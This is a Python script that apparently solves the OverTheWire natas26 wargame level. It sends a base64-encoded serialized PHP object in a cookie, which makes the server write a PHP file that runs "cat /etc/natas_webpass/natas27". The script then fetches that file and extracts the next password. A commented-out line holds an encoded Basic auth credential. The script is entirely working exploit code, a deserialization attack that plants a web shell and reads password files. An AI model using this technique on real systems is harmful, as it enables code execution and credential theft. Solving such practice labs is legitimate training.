import requests
import re
from requests.auth import HTTPBasicAuth

def solve26(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    #session.headers["Authorization"] = "Basic bmF0YXMyNjpvR2dXQUo3emNHVDI4dllhekdvNHJraE9QRGhCdTM0VA=="
    url = "http://natas26.natas.labs.overthewire.org/"
    session.cookies["drawing"] = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Rlc3QucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MzoiSGkKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTE6Ijw/IHBhc3N0aHJ1KCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KCiI7fQ=="
    session.get(url)
    resp = session.get(url + "/img/test.php")
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw

